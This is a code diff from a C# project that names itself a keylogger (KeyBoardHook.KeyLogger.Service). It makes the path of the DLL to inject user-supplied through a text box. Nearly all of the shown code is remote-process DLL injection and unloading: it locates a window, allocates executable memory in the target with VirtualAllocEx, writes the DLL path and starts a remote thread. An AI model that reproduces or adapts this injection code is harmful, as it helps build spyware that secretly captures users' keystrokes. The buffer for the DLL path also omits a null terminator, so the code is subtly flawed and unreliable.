@@ -29,12 +29,14 @@ namespace KeyBoardHook.KeyLogger.Service
 
         private TextBox TextBox;
         private TextBox TextBox2;
+        private TextBox TextBox5;
         private ComboBox comboBox;
 
-        public KeyLoggerService(TextBox TextBox,TextBox TextBox2,ComboBox comboBox)
+        public KeyLoggerService(TextBox TextBox,TextBox TextBox2,ComboBox comboBox,TextBox TextBox5)
         {
             this.TextBox = TextBox;
             this.TextBox2 = TextBox2;
+            this.TextBox5 = TextBox5;
             this.comboBox = comboBox;
 
             _logFile = new FileInfo("./_logFile.txt");
@@ -145,7 +147,7 @@ namespace KeyBoardHook.KeyLogger.Service
         // string sDllPath = "C:\\Work\\WorkSpace\\c++\\DllMain\\x64\\Release\\DllMain.dll";
         // string sDllPath = "C:\\Users\\voidm\\Desktop\\workspace\\hook\\DllMain.dll";
 
-        private string sDllPath = "C:\\Users\\voidm\\source\\repos\\Dll_dev\\x64\\Release\\Dll_dev.dll";
+        // private string sDllPath = "C:\\Users\\voidm\\source\\repos\\Dll_dev\\x64\\Release\\Dll_dev.dll";
         public unsafe void unInjectionCDLL(string className, string title)
         {
             var hWnd = NativeMethods.FindWindow(className,title);
@@ -164,7 +166,7 @@ namespace KeyBoardHook.KeyLogger.Service
             if (module32First)
              {
                  do {
-                     if (modEntry.szModule.Equals(sDllPath) || modEntry.szExePath.Equals(sDllPath))
+                     if (modEntry.szModule.Equals(TextBox5.Text) || modEntry.szExePath.Equals(TextBox5.Text))
                      {
                          flag = true;
                          break;
@@ -202,7 +204,7 @@ namespace KeyBoardHook.KeyLogger.Service
             MessageBox.Show($@"unInjectionCDLL remoteThread {remoteThread} successful");
 
             // 释放申请的内存
-            NativeMethods.VirtualFreeEx( openProcess, lpAddress, (IntPtr)sDllPath.Length, NativeMethods.Release );
+            NativeMethods.VirtualFreeEx( openProcess, lpAddress, (IntPtr)TextBox5.Text.Length, NativeMethods.Release );
             
             NativeMethods.CloseHandle(remoteThread);
             NativeMethods.CloseHandle(openProcess);
@@ -232,7 +234,7 @@ namespace KeyBoardHook.KeyLogger.Service
                 }
                     
                 // 在远程进程中为 sDllPath 分配内存
-                lpAddress = NativeMethods.VirtualAllocEx(openProcess, (IntPtr)null, (IntPtr)sDllPath.Length, NativeMethods.Commit, NativeMethods.ExecuteReadWrite);
+                lpAddress = NativeMethods.VirtualAllocEx(openProcess, (IntPtr)null, (IntPtr)TextBox5.Text.Length, NativeMethods.Commit, NativeMethods.ExecuteReadWrite);
 
                 if (lpAddress == IntPtr.Zero)
                 {
@@ -244,16 +246,16 @@ namespace KeyBoardHook.KeyLogger.Service
                 // 用来将 sDllPath 路径写入分配的缓冲区
                 // BitConverter.GetBytes(UInt64 Data)
                 
-                byte[] buffer = new byte[sDllPath.Length];
+                byte[] buffer = new byte[TextBox5.Text.Length];
                 int index = 0;
-                foreach (char ch in sDllPath)
+                foreach (char ch in TextBox5.Text)
                 {
                     buffer[index] = (byte)ch;
                     index++;
                 }
                 // float* buffers = stackalloc float[3];
                 IntPtr lpNumberOfBytesWritten;
-                Boolean writeBytes = MemUtil.WriteBytes(openProcess,lpAddress,buffer,sDllPath.Length);
+                Boolean writeBytes = MemUtil.WriteBytes(openProcess,lpAddress,buffer,TextBox5.Text.Length);
                 // var writeProcessMemory = NativeMethods.WriteProcessMemory(openProcess, lpAddress, buffer, sDllPath.Length + 1, out lpNumberOfBytesWritten);
                 if (!writeBytes)
                 {
